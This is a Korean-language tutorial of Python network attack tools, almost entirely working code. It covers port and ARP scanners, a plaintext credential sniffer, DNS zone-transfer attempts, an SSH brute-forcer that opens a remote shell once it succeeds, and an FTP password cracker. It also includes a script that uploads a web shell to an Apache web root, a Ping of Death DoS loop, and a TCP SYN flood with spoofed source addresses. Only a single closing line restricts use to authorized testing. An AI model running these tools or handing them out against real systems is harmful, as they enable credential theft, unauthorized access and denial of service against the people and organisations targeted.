# Python 네트워크 스캐닝 도구 개발

## 1. 소켓 프로그래밍 기초

```python
import socket
import threading
from datetime import datetime

# 기본 소켓 연결 테스트
def check_port(host, port, timeout=1):
    """단일 포트 연결 확인"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    result = sock.connect_ex((host, port))
    sock.close()
    return result == 0  # 0 = 성공 (열린 포트)

# 사용 예시
if check_port("192.168.1.1", 80):
    print("[+] Port 80 is OPEN")
```

---

## 2. 멀티스레드 포트 스캐너

```python
import socket
import threading
import queue
from datetime import datetime

class PortScanner:
    def __init__(self, target, start_port=1, end_port=1024, threads=100, timeout=1):
        self.target = target
        self.start_port = start_port
        self.end_port = end_port
        self.threads = threads
        self.timeout = timeout
        self.open_ports = []
        self.port_queue = queue.Queue()
        self.lock = threading.Lock()

    def scan_port(self):
        """작업 큐에서 포트를 꺼내 스캔"""
        while True:
            try:
                port = self.port_queue.get_nowait()
            except queue.Empty:
                break

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((self.target, port))
            sock.close()

            if result == 0:
                try:
                    # 서비스 이름 조회
                    service = socket.getservbyport(port)
                except:
                    service = "unknown"
                
                with self.lock:
                    self.open_ports.append((port, service))
                    print(f"[+] Port {port:5d} OPEN  ({service})")
            
            self.port_queue.task_done()

    def run(self):
        """포트 스캔 실행"""
        print(f"\n[*] 스캔 시작: {self.target}")
        print(f"[*] 범위: {self.start_port} - {self.end_port}")
        print(f"[*] 시작 시간: {datetime.now().strftime('%H:%M:%S')}")
        print("-" * 50)

        # 포트 큐 채우기
        for port in range(self.start_port, self.end_port + 1):
            self.port_queue.put(port)

        # 스레드 시작
        thread_list = []
        for _ in range(min(self.threads, self.end_port - self.start_port + 1)):
            t = threading.Thread(target=self.scan_port)
            t.daemon = True
            thread_list.append(t)
            t.start()

        # 완료 대기
        for t in thread_list:
            t.join()

        print("-" * 50)
        print(f"[*] 완료 시간: {datetime.now().strftime('%H:%M:%S')}")
        print(f"[*] 열린 포트: {len(self.open_ports)}개")
        
        return sorted(self.open_ports)


# 배너 그래버 (서비스 버전 수집)
def grab_banner(host, port, timeout=3):
    """서비스 배너 수집"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        
        # HTTP의 경우 요청 전송
        if port in [80, 8080, 8000]:
            sock.send(b"HEAD / HTTP/1.0\r\nHost: " + host.encode() + b"\r\n\r\n")
        elif port == 443:
            sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
        
        banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
        sock.close()
        return banner[:200]  # 처음 200자
    except:
        return None


if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print(f"사용법: python {sys.argv[0]} <타겟IP> [시작포트] [끝포트]")
        sys.exit(1)
    
    target = sys.argv[1]
    start = int(sys.argv[2]) if len(sys.argv) > 2 else 1
    end = int(sys.argv[3]) if len(sys.argv) > 3 else 1024
    
    scanner = PortScanner(target, start, end)
    open_ports = scanner.run()
    
    # 배너 수집
    print("\n[*] 배너 수집 중...")
    for port, service in open_ports:
        banner = grab_banner(target, port)
        if banner:
            print(f"    Port {port} ({service}): {banner[:80]}")
```

---

## 3. 네트워크 호스트 탐지 (ARP 스캔)

```python
from scapy.all import ARP, Ether, srp
import ipaddress

def arp_scan(network):
    """ARP를 이용한 네트워크 호스트 탐지"""
    print(f"[*] ARP 스캔: {network}")
    
    # ARP 요청 패킷 생성
    arp = ARP(pdst=network)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp
    
    # 패킷 전송 및 응답 수집
    result = srp(packet, timeout=3, verbose=False)[0]
    
    hosts = []
    for sent, received in result:
        hosts.append({
            'ip': received.psrc,
            'mac': received.hwsrc
        })
        print(f"[+] {received.psrc:15s}  {received.hwsrc}")
    
    print(f"\n[*] 총 {len(hosts)}개 호스트 발견")
    return hosts


# ICMP Ping 스캔 (ARP 불가 시)
def ping_scan(network):
    """ICMP를 이용한 호스트 탐지"""
    from scapy.all import IP, ICMP, sr1
    
    live_hosts = []
    net = ipaddress.ip_network(network, strict=False)
    
    for ip in net.hosts():
        ip_str = str(ip)
        packet = IP(dst=ip_str) / ICMP()
        reply = sr1(packet, timeout=1, verbose=False)
        
        if reply is not None:
            print(f"[+] {ip_str} is ALIVE")
            live_hosts.append(ip_str)
    
    return live_hosts


if __name__ == "__main__":
    arp_scan("192.168.1.0/24")
```

---

## 4. 패킷 스니퍼

```python
from scapy.all import sniff, IP, TCP, UDP, DNS, Raw
import datetime

def packet_callback(packet):
    """패킷 분석 콜백"""
    timestamp = datetime.datetime.now().strftime("%H:%M:%S.%f")[:-3]
    
    if packet.haslayer(IP):
        src_ip = packet[IP].src
        dst_ip = packet[IP].dst
        
        # TCP
        if packet.haslayer(TCP):
            sport = packet[TCP].sport
            dport = packet[TCP].dport
            flags = packet[TCP].flags
            
            # HTTP 요청 탐지
            if dport == 80 and packet.haslayer(Raw):
                payload = packet[Raw].load.decode('utf-8', errors='ignore')
                if payload.startswith(('GET ', 'POST ', 'PUT ', 'DELETE ')):
                    lines = payload.split('\r\n')
                    print(f"[HTTP] {src_ip} → {dst_ip} | {lines[0][:80]}")
                    return
            
            # FTP 자격증명 탐지
            if dport == 21 and packet.haslayer(Raw):
                payload = packet[Raw].load.decode('utf-8', errors='ignore').strip()
                if payload.upper().startswith(('USER ', 'PASS ')):
                    print(f"[FTP!] {src_ip} → {dst_ip} | {payload}")
                    return
            
            # Telnet 탐지
            if dport == 23 and packet.haslayer(Raw):
                payload = packet[Raw].load.decode('utf-8', errors='ignore')
                print(f"[TELNET!] {src_ip} | {repr(payload[:50])}")
                return
            
            # SYN 스캔 탐지
            if flags == 'S' and dport < 1024:
                print(f"[SCAN?] {src_ip} → {dst_ip}:{dport} SYN")
                return
        
        # DNS 쿼리 출력
        if packet.haslayer(DNS) and packet[DNS].qr == 0:
            domain = packet[DNS].qd.qname.decode().rstrip('.')
            print(f"[DNS] {src_ip} queries: {domain}")
            return
    
    # 기본 출력 (IP 패킷)
    if packet.haslayer(IP):
        print(f"[{timestamp}] {packet[IP].src} → {packet[IP].dst} | {packet[IP].proto}")


def start_sniffer(interface="eth0", count=0, filter_str=""):
    """패킷 스니퍼 시작"""
    print(f"[*] 스니핑 시작: {interface}")
    print("[*] Ctrl+C로 중지")
    print("-" * 60)
    
    sniff(
        iface=interface,
        prn=packet_callback,
        count=count,
        filter=filter_str,
        store=False
    )


# 자격증명 수집 특화 스니퍼
def credential_sniffer(interface="eth0"):
    """평문 자격증명 탐지 전용"""
    print("[*] 자격증명 스니퍼 (HTTP/FTP/Telnet)")
    
    KEYWORDS = [b'username', b'password', b'passwd', b'user=', b'pass=',
                b'login', b'credential', b'auth', b'USER ', b'PASS ']
    
    def check_credentials(packet):
        if packet.haslayer(Raw):
            payload = packet[Raw].load.lower()
            for keyword in KEYWORDS:
                if keyword.lower() in payload:
                    src = packet[IP].src if packet.haslayer(IP) else "?"
                    print(f"[!] 자격증명 감지 from {src}:")
                    print(f"    {packet[Raw].load[:200]}")
                    break
    
    sniff(iface=interface, prn=check_credentials, filter="tcp", store=False)
```

---

## 5. DNS 열거 도구

```python
import dns.resolver
import concurrent.futures

def dns_lookup(domain, record_type='A'):
    """DNS 레코드 조회"""
    try:
        answers = dns.resolver.resolve(domain, record_type)
        return [str(r) for r in answers]
    except:
        return []


def subdomain_enum(domain, wordlist_file, threads=50):
    """서브도메인 열거 (DNS 브루트포싱)"""
    found = []
    
    def check_subdomain(sub):
        target = f"{sub}.{domain}"
        result = dns_lookup(target, 'A')
        if result:
            print(f"[+] {target:40s} → {', '.join(result)}")
            found.append((target, result))
    
    print(f"[*] 서브도메인 열거: {domain}")
    
    with open(wordlist_file, 'r') as f:
        subdomains = [line.strip() for line in f if line.strip()]
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        executor.map(check_subdomain, subdomains)
    
    return found


def dns_zone_transfer(domain):
    """DNS 존 전송 시도 (AXFR)"""
    print(f"[*] 존 전송 시도: {domain}")
    
    # NS 서버 목록 조회
    ns_records = dns_lookup(domain, 'NS')
    
    for ns in ns_records:
        ns = ns.rstrip('.')
        print(f"[*] NS 서버 시도: {ns}")
        try:
            zone = dns.zone.from_xfr(dns.query.xfr(ns, domain))
            print(f"[!] 존 전송 성공! NS: {ns}")
            for name, node in zone.nodes.items():
                print(f"    {name}.{domain}")
        except Exception as e:
            print(f"    [-] 실패: {e}")


def reverse_dns_sweep(network):
    """역방향 DNS 조회 (IP → 도메인)"""
    import ipaddress
    
    net = ipaddress.ip_network(network, strict=False)
    
    for ip in net.hosts():
        ip_str = str(ip)
        try:
            result = dns.resolver.resolve_address(ip_str)
            hostname = str(result[0])
            print(f"[+] {ip_str:15s} → {hostname}")
        except:
            pass


# 실행 예시
if __name__ == "__main__":
    domain = "example.com"
    
    # A, MX, NS, TXT 레코드 수집
    for record_type in ['A', 'MX', 'NS', 'TXT', 'CNAME', 'SOA']:
        results = dns_lookup(domain, record_type)
        if results:
            print(f"[{record_type}] {domain}:")
            for r in results:
                print(f"    {r}")
    
    # 존 전송 시도
    dns_zone_transfer(domain)
```

---

## 6. SSH 브루트포서

```python
import paramiko
import time
from queue import Queue
import threading

class SSHBruteForcer:
    def __init__(self, target, port=22, threads=5, delay=0.5):
        self.target = target
        self.port = port
        self.threads = threads
        self.delay = delay  # 속도 제한 (초당 시도 수 제어)
        self.found = False
        self.credential_queue = Queue()
        self.lock = threading.Lock()

    def try_login(self, username, password):
        """SSH 로그인 시도"""
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        try:
            client.connect(
                self.target, 
                port=self.port,
                username=username, 
                password=password,
                timeout=5,
                banner_timeout=5
            )
            client.close()
            return True
        except paramiko.AuthenticationException:
            return False
        except Exception as e:
            return None  # 연결 오류

    def worker(self):
        """작업 스레드"""
        while not self.found:
            try:
                username, password = self.credential_queue.get_nowait()
            except:
                break
            
            time.sleep(self.delay)
            result = self.try_login(username, password)
            
            if result is True:
                with self.lock:
                    if not self.found:
                        self.found = True
                        print(f"\n[!!!] 성공! {username}:{password}")
                        # 세션 열기
                        self._open_session(username, password)
            elif result is None:
                # 연결 오류 → 재시도 큐에 추가
                self.credential_queue.put((username, password))
            else:
                print(f"[-] 실패: {username}:{password[:3]}***")
            
            self.credential_queue.task_done()

    def _open_session(self, username, password):
        """성공한 자격증명으로 명령 실행"""
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(self.target, port=self.port, 
                       username=username, password=password)
        
        print("\n[*] 인터랙티브 세션 시작 (exit로 종료)")
        while True:
            cmd = input(f"{username}@{self.target}$ ")
            if cmd.lower() == 'exit':
                break
            stdin, stdout, stderr = client.exec_command(cmd)
            print(stdout.read().decode())
            err = stderr.read().decode()
            if err:
                print(f"[STDERR] {err}")
        
        client.close()

    def run(self, usernames_file, passwords_file):
        """브루트포스 실행"""
        print(f"[*] SSH 브루트포스: {self.target}:{self.port}")
        
        with open(usernames_file) as uf, open(passwords_file) as pf:
            users = [u.strip() for u in uf]
            passwords = [p.strip() for p in pf]
        
        # 자격증명 조합 큐 생성
        for user in users:
            for pwd in passwords:
                self.credential_queue.put((user, pwd))
        
        print(f"[*] 시도 횟수: {self.credential_queue.qsize()}")
        
        # 스레드 시작
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join()
        
        if not self.found:
            print("[-] 유효한 자격증명을 찾지 못했습니다")
```

---

## 7. 취약점 스캐너 (CVE 기반)

```python
import socket
import re
import requests

class VulnScanner:
    """간단한 취약점 스캐너"""
    
    def __init__(self, target):
        self.target = target
        self.results = []

    def check_ftp_anonymous(self, port=21):
        """FTP 익명 로그인 확인"""
        try:
            sock = socket.socket()
            sock.settimeout(5)
            sock.connect((self.target, port))
            banner = sock.recv(1024).decode()
            
            sock.send(b"USER anonymous\r\n")
            resp = sock.recv(1024).decode()
            sock.send(b"PASS anonymous@test.com\r\n")
            resp = sock.recv(1024).decode()
            sock.close()
            
            if "230" in resp:  # 230 = 로그인 성공
                print(f"[VULN] FTP 익명 로그인 허용! ({self.target}:{port})")
                self.results.append(("FTP Anonymous", "HIGH", port))
        except:
            pass

    def check_http_headers(self, port=80):
        """HTTP 보안 헤더 확인"""
        try:
            r = requests.get(f"http://{self.target}:{port}", timeout=5, verify=False)
            headers = r.headers
            
            missing = []
            security_headers = [
                'X-XSS-Protection',
                'X-Frame-Options',
                'X-Content-Type-Options',
                'Strict-Transport-Security',
                'Content-Security-Policy'
            ]
            
            for header in security_headers:
                if header not in headers:
                    missing.append(header)
            
            if missing:
                print(f"[INFO] 누락된 보안 헤더: {', '.join(missing)}")
            
            # 서버 버전 노출
            if 'Server' in headers:
                server = headers['Server']
                print(f"[INFO] 서버 버전 노출: {server}")
                
                # 취약한 Apache 버전
                match = re.search(r'Apache/(\d+\.\d+\.\d+)', server)
                if match:
                    version = match.group(1)
                    print(f"[VULN?] Apache {version} — CVE 확인 필요")
        except:
            pass

    def check_smb_ms17_010(self, port=445):
        """EternalBlue (MS17-010) 취약점 확인"""
        try:
            # NetBIOS 세션 요청
            sock = socket.socket()
            sock.settimeout(5)
            sock.connect((self.target, port))
            
            # SMB Negotiate Protocol Request
            negotiate = (
                b'\x00\x00\x00\x54'  # NetBIOS
                b'\xff\x53\x4d\x42'  # SMB Header
                b'\x72\x00\x00\x00'
                b'\x00\x18\x01\x28\x00\x00\x00\x00\x00\x00\x00\x00'
                b'\x00\x00\x00\x00\x00\x00\xff\xfe\x00\x00\x00\x00'
                b'\x00\x31\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x31\x2e'
                b'\x30\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30\x30\x32'
                b'\x00\x02\x4e\x54\x20\x4c\x4d\x20\x30\x2e\x31\x32'
                b'\x00\x02\x53\x4d\x42\x20\x32\x2e\x30\x30\x32\x00'
            )
            sock.send(negotiate)
            response = sock.recv(1024)
            sock.close()
            
            if b'\xff\x53\x4d\x42' in response:
                print(f"[INFO] SMB 서비스 확인: {self.target}:{port}")
                # 실제 MS17-010 확인은 더 복잡한 패킷 교환 필요
        except:
            pass

    def run(self):
        """전체 스캔 실행"""
        print(f"[*] 취약점 스캔: {self.target}")
        self.check_ftp_anonymous()
        self.check_http_headers()
        self.check_smb_ms17_010()
        
        if self.results:
            print(f"\n[*] 발견된 취약점: {len(self.results)}개")
            for name, severity, port in self.results:
                print(f"    [{severity}] {name} (Port {port})")
        else:
            print("[-] 명확한 취약점을 찾지 못했습니다")
```

---

## 8. 실전 OSINT 도구 모음

```python
import requests
import json

class OSINTTools:
    """온라인 OSINT 수집 도구"""
    
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0'})

    def check_ip_reputation(self, ip):
        """IP 평판 확인 (AbuseIPDB)"""
        # API 키 필요: https://www.abuseipdb.com/
        headers = {
            'Accept': 'application/json',
            'Key': 'YOUR_API_KEY'
        }
        params = {'ipAddress': ip, 'maxAgeInDays': '90'}
        
        try:
            r = requests.get(
                'https://api.abuseipdb.com/api/v2/check',
                headers=headers, params=params, timeout=10
            )
            data = r.json()['data']
            print(f"IP: {ip}")
            print(f"  악성 보고: {data['totalReports']}건")
            print(f"  악성 점수: {data['abuseConfidenceScore']}%")
            print(f"  국가: {data['countryCode']}")
            print(f"  ISP: {data['isp']}")
        except Exception as e:
            print(f"오류: {e}")

    def shodan_search(self, api_key, query):
        """Shodan 검색"""
        # pip install shodan
        import shodan
        api = shodan.Shodan(api_key)
        
        results = api.search(query)
        print(f"[*] 검색 결과: {results['total']}개")
        
        for result in results['matches'][:10]:
            print(f"\n[+] {result['ip_str']}:{result['port']}")
            print(f"    조직: {result.get('org', 'N/A')}")
            print(f"    위치: {result.get('location', {}).get('country_name', 'N/A')}")
            print(f"    배너: {result.get('data', '')[:100]}")

    def whois_lookup(self, domain):
        """Whois 조회"""
        import whois  # pip install python-whois
        w = whois.whois(domain)
        print(f"도메인: {domain}")
        print(f"등록자: {w.registrant_name}")
        print(f"등록일: {w.creation_date}")
        print(f"만료일: {w.expiration_date}")
        print(f"네임서버: {w.name_servers}")


# 실행
if __name__ == "__main__":
    # 포트 스캐너
    scanner = PortScanner("192.168.1.1", 1, 1024)
    open_ports = scanner.run()
    
    # DNS 열거
    dns_zone_transfer("example.com")
    
    print("\n[*] 모든 스캔 완료")
```

---

---

## 9. 네트워크 해킹 원본 예제

### 예제7-1 port scanning — nmap 라이브러리로 포트 스캔 및 프로토콜/서비스 출력
```python
import sys
import os
import socket
import nmap                                                        #(1)

nm = nmap.PortScanner()                                            #(2)

nm.scan('server', '1-1024')                                        #(3)

for host in nm.all_hosts():                                        #(4)
    print('----------------------------------------------------')
    print('Host : {0} ({1})'.format(host, nm[host].hostname()))    #(5)
    print('State : {0}'.format(nm[host].state()))                  #(6)

    for proto in nm[host].all_protocols():                         #(7)
        print('----------')
        print('Protocol : {0}'.format(proto))                        

        lport = list(nm[host][proto].keys())                       #(8)
        lport.sort()
        for port in lport:
            print('port : {0}\tstate : {1}'.format(port, nm[host][proto][port]))   #(9)
print('----------------------------------------------------')
```

### 예제7-2 FTP Password Cracking — FTP 로그인 딕셔너리 공격으로 패스워드 크래킹
```python
from ftplib import FTP

wordlist = open('wordlist.txt', 'r')                  #(1)
user_login = "server"

def getPassword(password):                            #(2)
    try:
        ftp = FTP("server")                           #(3)
        ftp.login(user_login,password)                #(4)
        print "user password:", password
        return True
    except Exception:                                 #(5)
        return False    

passwords = wordlist.readlines()
for password in passwords:      
    password = password.strip()
    print "test password:", password
    if(getPassword(password)):                        #(6)
        break
wordlist.close()
```

### 예제7-3 Directory Listing — FTP 접속 후 재귀적 디렉토리 탐색으로 Apache 웹루트 탐색
```python
from ftplib import FTP

apacheDir = "htdocs"
serverName = "server"
serverID = "server"
serverPW = "server"

def getDirList(cftp, name):                            #(1)
    dirList = []
    if("." not in name):                               #(2)
        if(len(name) == 0):
            dirList = ftp.nlst()                       #(3)
        else:
            dirList = ftp.nlst(name)               
    return dirList

def checkApache(dirName1, dirName2):                   #(4)
    if(dirName1.lower().find(apacheDir) >= 0):             
        print dirName1
    if(dirName2.lower().find(apacheDir) >= 0):
        print dirName1 +"/"+ dirName2

ftp = FTP(serverName, serverID, serverPW)              #(5)

dirList1 = getDirList(ftp, "")                         #(6)

for name1 in dirList1:                                 #(7)
    checkApache(name1,"")                              #(8)
    dirList2 = getDirList(ftp, name1)                  #(9)
    for name2 in dirList2:
        checkApache(name1, name2)
        dirList3 = getDirList(ftp, name1+"/"+name2)
```

### 예제7-4 FTP Web Shell 공격 — FTP로 Apache htdocs에 웹셸 업로드
```python
from ftplib import FTP

apacheDir = "htdocs"
serverName = "server"
serverID = "server"
serverPW = "server"

ftp = FTP(serverName, serverID, serverPW)       #(1)

ftp.cwd("APM_Setup/htdocs")                     #(2)

fp = open("webshell.php","rb")                  #(3)
ftp.storbinary("STOR webshell.php",fp)          #(4)

fp.close()
ftp.quit()
```

### 예제7-5 Packet Sniffing — Raw 소켓으로 네트워크 패킷 캡처, FTP USER/PASS 자격증명 탐지
```python
import socket
import string

HOST = socket.gethostbyname(socket.gethostname())

s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)     #(1)
s.bind((HOST, 0))                                                         #(2)
s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)                     #(3)
s.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)                              #(4)

while True:
    data = s.recvfrom(65565)                                              #(5)
    printable = set(string.printable)                                     #(6)
    parsedData = ''.join(x if x in printable else '.' for x in data[0])

    if(parsedData.find("USER") > 0):                                      #(7)
        print parsedData
    elif(parsedData.find("PASS") > 0):
        print parsedData
    elif(parsedData.find("530 User cannot log in") > 0):
        print parsedData
    elif(parsedData.find("230 User logged in") > 0):
        print parsedData
```

### 예제7-6 Ping Of Death — 멀티스레드로 65500바이트 대용량 ping 패킷 반복 전송 (DoS)
```python
import subprocess
import thread
import time

def POD(id):                                                    #(1)
    ret = subprocess.call("ping server -l 65500", shell=True)
    print "%d," % id
      
for i in range(500):                                            #(2)
    thread.start_new_thread(POD, (i,))                          #(3)
    time.sleep(0.8)                                             #(4)
```

### 예제7-7 TCP SYN Flood — Raw 소켓으로 IP 스푸핑된 TCP SYN 패킷 대량 전송
```python
import socket, sys
from struct import *

def makeChecksum(msg):                                                #(1)
    s = 0
    for i in range(0, len(msg), 2):
        w = (ord(msg[i]) << 8) + (ord(msg[i+1]) )
        s = s + w
    s = (s>>16) + (s & 0xffff);
    s = ~s & 0xffff
    return s

def makeIPHeader(sourceIP, destIP):                                   #(2)
    version = 4
    ihl = 5
    typeOfService = 0
    totalLength = 20+20                                          
    id = 999                
    flagsOffSet = 0
    ttl =  255               
    protocol = socket.IPPROTO_TCP                             
    headerChecksum = 0             
    sourceAddress = socket.inet_aton ( sourceIP )
    destinationAddress = socket.inet_aton ( destIP )
    ihlVersion = (version << 4) + ihl
    return pack('!BBHHHBBH4s4s' , ihlVersion, typeOfService, totalLength, id, flagsOffSet,
                                  ttl, protocol, headerChecksum, sourceAddress, destinationAddress)   #(3)

def makeTCPHeader(port, icheckSum="none"):                            #(4)
    sourcePort = port                                            
    destinationAddressPort = 80                                 
    SeqNumber = 0
    AckNumber = 0
    dataOffset = 5                                                
    flagFin = 0
    flagSyn = 1                                                   
    flagRst = 0
    flagPsh = 0
    flagAck = 0
    flagUrg = 0

    window = socket.htons (5840)   

    if(icheckSum == "none"):
        checksum = 0
    else:
        checksum = icheckSum

    urgentPointer = 0
    dataOffsetResv = (dataOffset << 4) + 0
    flags = (flagUrg << 5)+ (flagAck << 4) + (flagPsh <<3)+ (flagRst << 2) + (flagSyn << 1) + flagFin
    return pack('!HHLLBBHHH', sourcePort, destinationAddressPort, SeqNumber, 
AckNumber, dataOffsetResv,  flags,  window, checksum, urgentPointer)             #(5)

s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)           #(6)
s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)                            #(7)

for j in range(1,20):                                                            #(8)
        for k in range(1,255):
                for l in range(1,255):
                        sourceIP = "169.254.%s.%s"%(k,l)                         #(9)
                        destIP = "169.254.27.229"   

                        ipHeader  = makeIPHeader(sourceIP, destIP)               #(10)
                        tcpHeader = makeTCPHeader(10000+j+k+l)                   #(11)

                        sourceAddr = socket.inet_aton( sourceIP )                #(12)
                        destAddr = socket.inet_aton(destIP)

                        placeholder = 0
                        protocol = socket.IPPROTO_TCP
                        tcpLen = len(tcpHeader)
                        psh = pack('!4s4sBBH', sourceAddr, destAddr, placeholder, protocol, tcpLen);
                        psh = psh + tcpHeader;
                        tcpChecksum = makeChecksum(psh)                          #(13)

                        tcpHeader = makeTCPHeader(10000+j+k+l,tcpChecksum)       #(14)

                        packet = ipHeader + tcpHeader                                       
                        s.sendto(packet, (destIP , 0 ))                          #(15)
```

## 10. 도구 실행 참고

```
⚠️  모든 도구는 허가된 환경에서만 사용!
    - CTF 챌린지
    - 자신이 소유한 시스템
    - 계약된 침투 테스트 대상

필요 패키지 설치:
pip install scapy paramiko requests dnspython python-whois

Scapy 사용 시 root/관리자 권한 필요:
sudo python3 scanner.py 192.168.1.0/24
```
